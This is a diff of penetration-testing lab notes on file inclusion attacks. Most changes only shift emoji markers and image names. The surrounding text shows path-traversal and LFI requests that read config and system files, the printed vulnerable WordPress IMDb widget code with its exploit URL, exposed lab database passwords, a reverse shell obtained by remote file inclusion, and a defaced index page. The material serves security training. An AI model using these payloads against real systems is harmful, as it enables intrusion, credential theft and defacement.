@@ -1743,7 +1739,7 @@ Content-Length: 6485
 <?php
 /**
  * This singleton class provides a pooled Doctrine connection to consumers. All connection data
- * is configurable via sqlconf.php. 📌
+ * is configurable via sqlconf.php.📌
  *
  * If needed, the instance can be used in a transactional context:
  * <code>
@@ -1782,6 +1778,8 @@ Content-Length: 6485
 [...]
 ```
 
+`burpsuite` > `Repeater`
+
 `HTTP Request`:
 ```http
 POST /portal/import_template.php HTTP/2
@@ -1801,7 +1799,7 @@ Te: trailers
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 71
 
-mode=get&docid=../../../../../../var/www/html/sites/default/sqlconf.php
+mode=get&docid=../../../../../../var/www/html/sites/default/sqlconf.php📌
 ```
 `HTTP Response`:
 ```http
@@ -1821,8 +1819,8 @@ Content-Length: 636
 
 $host	= '127.0.0.1';
 $port	= '3306';
-$login	= 'openemr'; 🔑
-$pass	= 'password1'; 🔑
+$login	= 'openemr';🔑
+$pass	= 'password1';🔑
 $dbase	= 'openemr';
 
 //Added ability to disable
@@ -1897,7 +1895,7 @@ The following credentials might be needed:
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.137.251.2 📌 netmask 255.255.255.0  broadcast 192.137.251.255
+        inet 192.137.251.2📌 netmask 255.255.255.0  broadcast 192.137.251.255
         ether 02:42:c0:89:fb:02  txqueuelen 0  (Ethernet)
         RX packets 17  bytes 1446 (1.4 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -1911,16 +1909,16 @@ http://192.137.251.3/ [302 Found] Apache[2.4.7], Country[UNITED STATES][US], HTT
 
 http://192.137.251.3/portal.php [302 Found] Apache[2.4.7], Cookies[PHPSESSID], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.137.251.3], PHP[5.5.9-1ubuntu4.25], RedirectLocation[login.php], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 
-http://192.137.251.3/login.php [200 OK] Apache[2.4.7], Cookies[PHPSESSID], Country[UNITED STATES][US], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], 📌 IP[192.137.251.3], PHP[5.5.9-1ubuntu4.25], PasswordField[password], Script, Title[bWAPP - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
+http://192.137.251.3/login.php [200 OK] Apache[2.4.7], Cookies[PHPSESSID], Country[UNITED STATES][US], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)],📌 IP[192.137.251.3], PHP[5.5.9-1ubuntu4.25], PasswordField[password], Script, Title[bWAPP - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 ```
 
-![Lab - Local File Inclusion](./assets/file_and_resource_attacks_lab_local_file_inclusion.png)
+![Lab - Local File Inclusion](./assets/06_file_and_resource_attacks_lab_local_file_inclusion.png)
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-GET /rlfi.php?language=login.php&action=go HTTP/1.1 📌
+GET /rlfi.php?language=login.php&action=go📌 HTTP/1.1
 Host: 192.137.251.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -1950,7 +1948,7 @@ Content-Type: text/html
     
 [...]
 
-    <h1>Login</h1> 📌
+    <h1>Login</h1>📌
 
     <p>Enter your credentials <i>(bee/bug)</i>.</p>
 
@@ -1987,7 +1985,7 @@ Content-Type: text/html
 
 `HTTP Request`:
 ```http
-GET /rlfi.php?language=/etc/passwd&action=go HTTP/1.1 📌
+GET /rlfi.php?language=/etc/passwd&action=go📌 HTTP/1.1
 Host: 192.137.251.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -2048,7 +2046,7 @@ mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
 
 `HTTP Request`:
 ```http
-GET /rlfi.php?language=/etc/apache2/apache2.conf&action=go HTTP/1.1 📌
+GET /rlfi.php?language=/etc/apache2/apache2.conf&action=go📌 HTTP/1.1
 Host: 192.137.251.3
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -2191,11 +2189,11 @@ In the exercise below, the attacker is unauthenticated to the web application an
 
 #### Lab Solution
 
-![Lab - WordPress IMDb Widget](./assets/file_and_resource_attacks_lab_wordpress_imdb_widget.png)
+![Lab - WordPress IMDb Widget](./assets/06_file_and_resource_attacks_lab_wordpress_imdb_widget.png)
 
 `whatweb https://1ffvba8gyrsoytocyh0wt2kxe.eu-central-6.attackdefensecloudlabs.com/`:
 ```
-https://1ffvba8gyrsoytocyh0wt2kxe.eu-central-6.attackdefensecloudlabs.com/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[172.104.135.113], JQuery[1.11.3], MetaGenerator[WordPress 4.4], 📌 PHP[5.5.9-1ubuntu4.25], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[wpvuln &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.4], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
+https://1ffvba8gyrsoytocyh0wt2kxe.eu-central-6.attackdefensecloudlabs.com/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[172.104.135.113], JQuery[1.11.3], MetaGenerator[WordPress 4.4],📌 PHP[5.5.9-1ubuntu4.25], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[wpvuln &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.4], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
 ```
 
 `gobuster dir --url https://1ffvba8gyrsoytocyh0wt2kxe.eu-central-6.attackdefensecloudlabs.com/ --wordlist /usr/share/wordlists/dirb/common.txt`:
@@ -2315,9 +2313,9 @@ Interesting Finding(s):
 [+] Enumerating All Plugins (via Passive Methods)
 [+] Checking Plugin Versions (via Passive and Aggressive Methods)
 
-[i] Plugin(s) Identified:
+[i] Plugin(s) Identified:📌
 
-[+] imdb-widget 📌
+[+] imdb-widget📌
  | Location: https://1ffvba8gyrsoytocyh0wt2kxe.eu-central-6.attackdefensecloudlabs.com/wp-content/plugins/imdb-widget/
  | Last Updated: 2016-03-28T12:41:00.000Z
  | [!] The version is out of date, the latest version is 1.1.0
@@ -2367,15 +2365,15 @@ Shellcodes: No Results
 # Tested on: MSWin32
 # Version: 1.0.8
 
-# Vuln file : pic.php 📌
+# Vuln file : pic.php📌
 
 <?php
 
 header( 'Content-Type: image/jpeg' );
-readfile( $_GET["url"] ); 📌
+readfile( $_GET["url"] );📌
 
 
-# PoC : /wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php 📌
+# PoC : /wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php📌
 # Right click -> Save As -> rename pic.jpg in .txt and read file
 
 # 26/03/2016 - Informed Vendor about Issue
@@ -2409,10 +2407,10 @@ readfile( $_GET["url"] ); 📌
 define('DB_NAME', 'wordpress');
 
 /** MySQL database username */
-define('DB_USER', 'pentester'); 🔑
+define('DB_USER', 'pentester');🔑
 
 /** MySQL database password */
-define('DB_PASSWORD', 'password1'); 🔑
+define('DB_PASSWORD', 'password1');🔑
 
 /** MySQL hostname */
 define('DB_HOST', 'localhost');
@@ -2478,7 +2476,7 @@ Instructions: 
 `ifconfig eth1`:
 ```
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.250.182.2 📌 netmask 255.255.255.0  broadcast 192.250.182.255
+        inet 192.250.182.2📌 netmask 255.255.255.0  broadcast 192.250.182.255
         ether 02:42:c0:fa:b6:02  txqueuelen 0  (Ethernet)
         RX packets 17  bytes 1446 (1.4 KiB)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -2488,10 +2486,10 @@ eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 `whatweb http://192.250.182.3/`:
 ```
-http://192.250.182.3/ [200 OK] Apache[2.4.7], Cookies[PHPSESSID,showhints], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], 📌 IP[192.250.182.3], JQuery, PHP[5.5.9-1ubuntu4.25], PoweredBy[HTTP], Script[text/javascript], UncommonHeaders[logged-in-user], X-Powered-By[PHP/5.5.9-1ubuntu4.25], X-XSS-Protection[0]
+http://192.250.182.3/ [200 OK] Apache[2.4.7], Cookies[PHPSESSID,showhints], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)],📌 IP[192.250.182.3], JQuery, PHP[5.5.9-1ubuntu4.25], PoweredBy[HTTP], Script[text/javascript], UncommonHeaders[logged-in-user], X-Powered-By[PHP/5.5.9-1ubuntu4.25], X-XSS-Protection[0]
 ```
 
-![Lab - Remote File Inclusion I](./assets/file_and_resource_attacks_lab_remote_file_inclusion_i.png)
+![Lab - Remote File Inclusion I](./assets/06_file_and_resource_attacks_lab_remote_file_inclusion_i.png)
 
 `locate -i 'webshells' | grep -E '\.php$'`:
 ```
@@ -2604,7 +2602,7 @@ Ncat: Connection from 192.250.182.3:33354.
 Linux victim-1 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 10:34:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
  13:41:37 up 103 days,  7:03,  0 users,  load average: 0.31, 0.60, 0.71
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 /bin/sh: 0: can't access tty; job control turned off
 ```
 ```
@@ -2663,7 +2661,7 @@ www-data@victim-1:/$ echo '<h1>You have been hacked!</h1>' >> ./index.php
 
 `curl -s http://192.250.182.3/index.php | grep 'hacked'`:
 ```html
-	<h1>You have been hacked!</h1> 🚩
+	<h1>You have been hacked!</h1>🚩
 ```
 
 ---
